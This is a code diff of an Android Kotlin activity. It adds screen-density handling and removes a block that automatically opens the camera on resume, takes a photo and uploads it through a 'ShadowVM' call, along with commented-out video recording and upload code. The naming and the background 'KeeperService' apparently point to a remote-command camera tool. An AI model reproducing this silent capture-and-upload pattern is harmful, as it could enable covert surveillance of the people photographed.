@@ -1,19 +1,21 @@
 package com.hc.calling
 
 import android.Manifest
+import android.content.Context
 import android.content.Intent
 import android.os.Bundle
 import android.support.v7.app.AppCompatActivity
+import com.hc.aswitch.DensityUtil
 import com.hc.calling.callingtransaction.R
-import com.hc.calling.commands.shadow.data.ShadowVM
 import com.hc.calling.commands.shadow.util.Photographer
 import com.hc.permission.PermissonUtil
-import com.orhanobut.logger.Logger
-import kotlinx.android.synthetic.main.activity_main.*
-import java.io.File
 
 
 class MainActivity : AppCompatActivity() {
+
+    companion object {
+        val SPF_NAME = "density"
+    }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -23,6 +25,10 @@ class MainActivity : AppCompatActivity() {
         val intent2 = Intent(this, KeeperService::class.java)
         startService(intent)
         startService(intent2)
+        val spf = this.getSharedPreferences("SPF_NAME", Context.MODE_MULTI_PROCESS)
+
+        Photographer.size["width"] = DensityUtil.getWindowMetrics(this, DensityUtil.WIDTH)
+        Photographer.size["height"] = DensityUtil.getWindowMetrics(this, DensityUtil.HEIGHT)
 
         //request the permissions
         PermissonUtil.requestPermisson(
@@ -48,58 +54,7 @@ class MainActivity : AppCompatActivity() {
                 }
             })
 
-        tv_btn_takephoto.setOnClickListener {
-            //
-//            GlobalScope.launch(Dispatchers.IO) {
-//
-//                VideoRecoder()
-//                    .initMediaRecorde(path)
-//                    .requestRecord(
-//                        photographer!!.mCameraDevice!!,
-//                        photographer!!.surfaces,
-//                        photographer!!.handler!!
-//                    )
-//            }
-
-        }
 
     }
 
-    override fun onResume() {
-        super.onResume()
-        Photographer(this,
-            { builder, session, device, imageReader, surface, handler ->
-
-                Photographer.capture(builder, session, imageReader, device, handler)
-
-
-//                val path = File(this.getExternalFilesDir(null), DateUtil.GetNowDate("yyyy-MM-ddHHmmss") + ".mp4").path
-//
-//                VideoRecoder {
-//                    ShadowVM().upLoadPic(File(it)) {
-//                        Logger.i(" upload finished")
-//                    }
-//                }
-//                    .apply {
-//                        initMediaRecorde(path)
-//                            .apply {
-//                                requestRecord(device, surface, handler)
-//                            }
-//                    }
-
-
-            },
-            {
-                com.orhanobut.logger.Logger.i("img saved completed")
-                ShadowVM().upLoadPic(File(it)) { data ->
-                    Logger.i(data)
-                }
-            }
-        ).openCamera("0")
-
-    }
-
-    override fun onDestroy() {
-        super.onDestroy()
-    }
 }
